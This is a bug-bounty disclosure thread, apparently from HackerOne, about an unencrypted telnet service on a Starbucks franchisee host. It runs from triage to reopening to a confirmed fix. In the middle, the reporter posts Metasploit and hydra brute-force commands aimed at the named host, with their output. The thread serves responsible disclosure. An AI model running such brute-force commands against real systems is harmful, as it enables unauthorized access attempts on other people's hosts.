title: Exposed Unencrypted Telnet Endpoint

profile.name: Starbucks
profile.about: Inspiring and nurturing the human spirit -- one person, one cup, one neighborhood at a time.

vulnerability_information:
Hi,

I'm not sure where to submit this as I know it is a low/medium risk issue on an asset which is out of scope. Essentially I stumbled across the endpoint whilst looking at other Starbucks domains within scope, the affected host is:
`franchisee.starbucks.com:23` it was found to be running an instance of telnet that is brute-forcible however given the host is out of scope, no attempts have been made to acquire access. When connecting to the host via telnet or netcat the following banner is presented:
`N4-DC4-STARBUCKS-RTR-01 (ttyp0)`

I'd recommend this host/endpoint be locked down ensuring that telnet is only reachable from VPN or inside the firewall. 

Thanks,

@ZephrFish
vulnerability_information_html:
Hi,

I'm not sure where to submit this as I know it is a low/medium risk issue on an asset which is out of scope. Essentially I stumbled across the endpoint whilst looking at other Starbucks domains within scope, the affected host is:
franchisee.starbucks.com:23 it was found to be running an instance of telnet that is brute-forcible however given the host is out of scope, no attempts have been made to acquire access. When connecting to the host via telnet or netcat the following banner is presented:
N4-DC4-STARBUCKS-RTR-01 (ttyp0)

I'd recommend this host/endpoint be locked down ensuring that telnet is only reachable from VPN or inside the firewall.

Thanks,

@ZephrFish

activities.markdown_message:
Hi @zephrfish thank you for the report. We are reviewing this internally and will soon update the report.

Thank you,
@rockyrobot

activities.message:
Thanks for getting back, I look forward to the outcome.
Regards
activities.markdown_message:
Thanks for getting back, I look forward to the outcome.
Regards

Hi @zephrfish thank you for the report. I did further digging into this however I am not sure if brute force is actually applicable on the telnet service. While attempting a brute force, the connection was closed by the remote service. I am closing this report as N/A. If you do find a way that brute force is applicable please let us know so that we can discuss this internally to understand if we will fix it or not.

Thank you for participating in our program. We look forward to more reports from you in future.
@rockyrobot

activities.message:
HI @rockyrobot thanks for the feedback out of interest what techniques did you try to replicate a brute-force? 

By utilizing the metasploit module it is possible to run through a usernames file and passwords file without the connection dropping:

# PoC Metasploit
```
msfconsole
use auxiliary/scanner/telnet/telnet_login
set USERPASS_FILE /tmp/users.txt
set USER_FILE /tmp/users.txt
set USERPASS_FILE /tmp/users.txt
set RHOSTS franchisee.starbucks.com
run
```

This sets up metasploit to fire off an attack against `franchisee.starbucks.com`  the output from a short list can be seen below agains the `root` user:

```
[-] 158.255.231.98:23     - 158.255.231.98:23 - LOGIN FAILED: root: (Incorrect: )

As there are many ways to skin a cat I have also included an example with `hydra`:

# PoC Hydra
` hydra -L users -P pass.txt telnet://franchisee.starbucks.com`

```
Hydra v8.3 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2016-12-30 13:33:52
[DATA] max 30 tasks per 1 server, overall 64 tasks, 110000 login tries (l:11/p:10000), ~57 tries per task
[DATA] attacking service telnet on port 23
[STATUS] 48.00 tries/min, 48 tries in 00:01h, 109952 to do in 38:11h, 30 active
[STATUS] 16.00 tries/min, 48 tries in 00:03h, 109952 to do in 114:33h, 30 active
[STATUS] 14.43 tries/min, 101 tries in 00:07h, 109899 to do in 126:57h, 30 active
```

Given the estimate from hydra a brute force would take a while however it is possible, as demonstrated in the outputs above.

Thanks,

@zephrfish

```

```

```

activities.message: Hi @zephrfish interesting for some reason it dropped on me. I am sending this internally to see what our team has to say.
activities.markdown_message: Hi @zephrfish interesting for some reason it dropped on me. I am sending this internally to see what our team has to say.

activities.message: I am reopening this while we investigate.
activities.markdown_message: I am reopening this while we investigate.

activities.message: @zephrfish, Thank you for notifying on this one. Please allow us sometime for notifying and working with the team.
activities.markdown_message: @zephrfish, Thank you for notifying on this one. Please allow us sometime for notifying and working with the team.

activities.message: Thanks for the reply,  does no bounty impact the rep score negatively?
activities.markdown_message: Thanks for the reply, does no bounty impact the rep score negatively?

@zephrfish based on my experience I do not believe it will lower your reputation. Reputation signal is based on average of reputation per closed report so likely less than 7? Impact however is determined by average bounty which is 25 or 50 or less depending on bounty. So I believe this should not hurt your signal/reputation. Correct me if I am wrong on this.

Thank you. Happy New Year!
@rockyrobot

activities.message:
Hi @verona ,

I can confirm that this issue is fixed, 23 is closed with the host only having 80,443 & 3389 open. 

```
Starting Nmap 7.31 ( https://nmap.org ) at 2017-01-06 15:52 EST
Nmap scan report for franchisee.starbucks.com (158.255.231.98)
Host is up (0.10s latency).                                                                 
Not shown: 86 filtered ports, 11 closed ports
PORT     STATE SERVICE 
80/tcp   open  http 
443/tcp  open  https
3389/tcp open  ms-wbt-server    
```

Thanks,

Andy
